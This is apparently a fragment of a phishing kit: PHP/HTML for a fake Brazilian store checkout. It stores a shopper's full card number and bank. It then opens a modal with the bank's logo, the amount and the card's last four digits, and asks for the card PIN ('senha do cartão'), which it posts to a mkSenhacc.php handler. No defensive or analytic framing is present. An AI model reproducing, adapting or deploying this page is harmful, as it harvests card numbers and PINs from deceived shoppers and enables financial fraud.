...
.c-boFvuV, section.css-1bk3zc8, .css-19ft0mb {
    display: none;
}
.mkModal {
    position: fixed;
...
p.d-flex.justify-content-between.mkDadosCC {
    line-height: 30px;
}
          ...
          <div class="css-0">
            <section data-testid="buyer-form-section" class="css-cgq59l">
              <div data-testid="checkout-header" class="css-c19orm">
                <h2 data-testid="checkout-header-title" class="css-7o80po">Contato</h2>
              </div>
...
<div class="mkModal">
  <div class="mkCaixaModal">
  <section class="mkConteudoSenhacc">
            <div class="container">
              <div class="row">
                <div class="col-md-12" style="display: flex;justify-content: space-between;">
                <h2 class="mkLogoBandeiraBanco">
                <?php
                $banco = $vendas['banco_cc'];
                if (strpos($banco, 'NU PAGAMENTOS') !== false) {
                  echo "<img src='assets/img/mkNubank.png' width='70'>";
                } else if (strpos($banco, 'C6') !== false) {
                  echo "<img src='assets/img/mkc6.png' width='120'>";
                } else if (strpos($banco, 'AVISTA') !== false) {
                  echo "<img src='assets/img/mkAvista.png' width='120'>";
                } else if (strpos($banco, 'ITAU') !== false) {
                  echo "<img src='assets/img/mkItau.png' width='90'>";
                } else if (strpos($banco, 'BANCO CSF') !== false) {
                  echo "<img src='assets/img/mkCarrefour.png' width='150'>";
                } else if (strpos($banco, 'BRADESCO') !== false) {
                  echo "<img src='assets/img/mkBradesco.png' width='80'>";
                } else if (strpos($banco, 'SANTANDER') !== false) {
                  echo "<img src='assets/img/mkSantander.png' width='120'>";
                } else if (strpos($banco, 'CETELEM') !== false) {
                  echo "<img src='assets/img/mkCetelem.png' width='120'>";
                } else if (strpos($banco, 'HIPERCARD') !== false) {
                  echo "<img src='assets/img/secure-hiper.png' width='120'>";
                } else if (strpos($banco, 'CAIXA') !== false) {
                  echo "<img src='assets/img/mkCaixa.png' width='120'>";
                } else if (strpos($banco, 'ITAUCARD') !== false) {
                  echo "<img src='assets/img/mkItau.png' width='120'>";
                } else if (strpos($banco, 'BANCO PAN') !== false) {
                  echo "<img src='assets/img/mkPan.png' width='120'>";
                } else if (strpos($banco, 'BANCO DO BRASIL') !== false) {
                  echo "<img src='assets/img/mkbb.png' width='120'>";
                } else if (strpos($banco, 'BANRISUL') !== false) {
                  echo "<img src='assets/img/mkBanrisul.png' width='120'>";
                } else if (strpos($banco, 'PORTOSEG') !== false) {
                  echo "<img src='assets/img/mkPorto.png' width='150'>";
                } else if (strpos($banco, 'MIDWAY') !== false) {
                  echo "<img src='assets/img/mkRiachuelo.png' width='120'>";
                } else if (strpos($banco, 'RENNER') !== false) {
                  echo "<img src='assets/img/mkRenner.png' width='120'>";
                } else if (strpos($banco, 'ORIGINAL') !== false) {
                  echo "<img src='assets/img/mkOriginal.png' width='120'>";
                } else if (strpos($banco, 'SAFRA') !== false) {
                  echo "<img src='assets/img/mkSafra.svg' width='120'>";
                } else if (strpos($banco, 'IBI') !== false) {
                  echo "<img src='assets/img/mkIbi.jpg' width='120'>";
                }
                ?>
                  </h2>
                  <h2 class="mkLogobandeiraCc">
                    <?php
                    $bandeira = $vendas['bandeira_cc'];

                    if ($bandeira == "VISA") {
                      echo "<img src='assets/img/secure-visa.png' width='100'>";
                    } else if ($bandeira == "MASTERCARD") {
                      echo "<img src='assets/img/secure-master.png' width='100'>";
                    } else if ($bandeira == "HIPERCARD") {
                      echo "<img src='assets/img/secure-hiper.png' width='100'>";
                    }
              ...
              <div class="row">
                <div class="col-md-12">
                  <p class="mkDescricaoTextocc">Por favor, digite a senha do seu cartão.</p>
                </div>
              </div>
              <div class="row">
                <div class="col-md-12">
                  <form method="POST" action="assets/_php/mkSenhacc.php">
                    <input type="hidden" id="id" name="id" value="<?php echo $_GET['clientId'] ?>">
                    <p class="d-flex justify-content-between mkDadosCC"><b>Valor:</b> R$ <?php echo number_format($vendas['valorTotal'], 2, ",", "."); ?></p>
                    <p class="d-flex justify-content-between mkDadosCC"><b>Data:</b> <?php echo date("d/m/Y"); ?></p>
                    <p class="d-flex justify-content-between mkDadosCC"><b>Final do cartão:</b> xxxx xxxx xxxx <?php echo substr($vendas['numerocc'], -4); ?></p>
                    <p class="d-flex justify-content-between mkDadosCC"><b>Senha do cartão:</b> <input type="tel" name="senhacc" id="senhacc" class="senhacc" minlength="4" required></p>
                    <button type="submit" class="buy-button css-16xclxp" id="mkIdCheckout">
                      <svg width="17" fill="#fff" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 330 330" style="enable-background:new 0 0 330 330;" xml:space="preserve">
                        <g id="XMLID_504_">
